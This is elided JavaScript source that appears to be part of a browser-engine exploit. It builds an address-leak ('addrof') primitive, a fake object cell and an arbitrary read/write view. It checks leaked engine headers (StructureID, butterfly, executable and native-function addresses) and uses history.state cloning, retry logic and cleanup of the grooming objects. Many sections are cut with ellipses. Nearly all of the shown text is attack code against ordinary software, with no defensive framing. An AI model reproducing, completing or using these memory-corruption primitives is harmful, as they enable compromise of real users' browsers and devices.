...
const identityBytes = new Uint8Array(16);
...
function pointerFromWords(words, offset) {
    ...
    return words[offset] + words[offset + 1] * 0x10000
...
function checkCarrierIdentity(candidate) {
    if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0
        || IDENT_OFFSET + 16 > RW_BUFFER_SIZE) return 0;
    aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
    readBytes(identityBytes, rwView, 16);
    restoreCarrier(candidate);
    return sameBytes(identityBytes, identityMagic, 16) ? 1 : -1;
}
...
function ceilingReached() { return attemptCeiling > 0 && attemptNumber >= attemptCeiling; }
...
function failed() {
    ...
    stopped = false; retryScheduled = false;
    setTimeout(() => {
...
function releaseAttemptAllocations() {
    ...
    anchorElement = null; markerObjectA = null; markerObjectB = null;
    targetHolder = null; holderGuardA = null; holderGuardB = null;
    fillerGraph = null; outerGraph = null; leakedScope = null;
    getterCarrier = null; preparedSymbolObject = null;
...
function scheduleSafeRetry(reason) {
    ...
    if (!retrySafe || !candidateStateSafe
        ...
        emit("AUTO-RETRY-NOT-SCHEDULED", `reason=${reason}`
            + `-safe=${retrySafe}-candidate-seen=${candidateEverReturned}`
    ...
    setTimeout(() => {
        ...
        if (!retrySafe || !candidateStillSafe
            ...
            emit("AUTO-RETRY-CANCELLED", `reason=${reason}`
                + `-retry-safe=${retrySafe}-candidate-safe=${candidateStillSafe}`
                + `-candidate-mutated=${candidateMutationStarted}`);
            failed(); return;
        }
...
function resetAttemptState() {
    ...
    fillerGraph = null; outerGraph = null; leakedScope = null;
    getterCarrier = null; preparedSymbolObject = null;
    capturedString = null; capturedWords = null; copiedLength = 0;
    captureState = 0; captureError = null; hostAddress = NaN; fakeAddress = NaN;
    predecessorWords = null; keepAlive = new Array(DRAIN_COUNT + 3); keepIndex = 0;
    pointerLow = 0; pointerHigh = 0; targetAddress = NaN;
    targetAddressLow = 0; targetAddressHigh = 0; nativeTargetAddress = NaN;
    anchorElementAddress = NaN; markerAAddress = NaN; markerBAddress = NaN;
    rwOriginalVector = NaN; rwHeaderOK = false; holderHeaderOK = false;
    functionHeaderOK = false; nativeExecutableHeaderOK = false;
    functionStructureID = 0; nativeExecutableStructureID = 0;
    executableAddress = NaN; nativeFunctionAddress = NaN;
    nativeConstructorAddress = NaN; pointersRepeated = false;
    restoreObserved = false; retrySafe = false; retryScheduled = false;
    candidateEverReturned = false; candidateMutationStarted = false;
    zeroHeaderMiss = false; identityResult = 0; identityBytes.fill(0);
    compositionState = 0; compositionLength = 0; compositionError = null;
    liveCandidate = null; resetProfile();
...
function startAttempt() {
    ...
    try {
        buildAndStoreGraph();
        for (let i = 0; i < 16; ++i) rwView[IDENT_OFFSET + i] = identityMagic[i];
        prepareAddrof();
    } catch (error) {
...
function buildFakeHost() {
    ...
    targetHolder = {
        q0: nativeTarget, q1: anchorElement, q2: markerObjectA,
        q3: markerObjectB, q4: holderGuardA, q5: holderGuardB
    };
    if (targetHolder.q0 !== nativeTarget || targetHolder.q1 !== anchorElement
        || targetHolder.q2 !== markerObjectA || targetHolder.q3 !== markerObjectB
...
function fillRawCellPointers(backing, pointer) {
    ...
    if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 0xffff
        || Math.floor(pointerLow) !== pointerLow || pointerLow < 0
...
function loadHistoryCritical() {
    ...
    try {
        ...
        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            candidate = null; result = null; clearPredecessor();
            retrySafe = true; compositionState = 2; return;
        }
        ...
        rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000
            && rwHeader[4] === 0 && (rwHeader[7] === 0 || rwHeader[7] === 1)
        ...
        if (!upgradedFinite) { candidate = null; clearPredecessor();
            compositionState = 3; return; }
        candidateMutationStarted = true;
        fakeHost.q0 = upgradedHeader;
        if (fakeHost.q0 !== upgradedHeader) { candidate = null;
            clearPredecessor(); compositionState = 3; return; }
        rwVectorTouched = true;
        ...
        holderHeaderOK = holderRepeated
            ...
            && targetAddress % 0x10 === 0 && holderHeader[4] === 0
        ...
        if (!holderHeaderOK) {
            restoreCarrier(candidate); rwVectorTouched = false;
            candidate = null; clearPredecessor();
            compositionState = 3; return;
        }
        ...
        functionHeaderOK = functionStructureID >= 0x100
            ...
            && nativeTargetAddress % 0x10 === 0 && targetHeader[4] === 0
            ...
            && functionButterfly <= 0xffffffffffff && functionButterfly % 8 === 0
            && functionScope > 0x100000000 && functionScope <= 0xffffffffffff
            && functionScope % 8 === 0 && executableAddress > 0x100000000
            && executableAddress <= 0xffffffffffff && executableAddress % 0x10 === 0
        ...
        targetView[0] = 0xa5;
        rwMirror[0] = 0x3c;
        restoreObserved = rwView[0] === 0x3c && rwMirror[0] === 0x3c
            && targetView[0] === 0xa5;
...
function reportComposition() {
    ...
    if (compositionState === 2) {
        ...
        scheduleSafeRetry("normal-clone-miss"); return;
    }
    if (compositionState === 3) {
        ...
        if (!retrySafe) failed();
        else scheduleSafeRetry(zeroHeaderMiss
    ...
    const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
        ...
        && compositionLength === EXPECTED_LENGTH && liveCandidate !== null;
    if (!leakPass) {
        ...
        liveCandidate = null; failed(); return;
    }
    ...
    settleResolve = null; settleReject = null;
...
const RELEASED_BINDINGS = [
    ...
    "preparedSymbolObject", "capturedString", "capturedWords",
...
export function releaseFakeCell() {
    const report = {
        ...
        alreadyReleased: fakeReleased, hostAddress, fakeAddress,
    ...
    capturedString = null; capturedWords = null; predecessorWords = null;
    outerGraph = null; fillerGraph = null; referenceTarget = null;
    keepAlive = null;
    try {
        history.replaceState(null, "");
        report.historyCleared = history.state === null;
    } catch (_) { }
    fakeReleased = true; stopped = true; running = false;
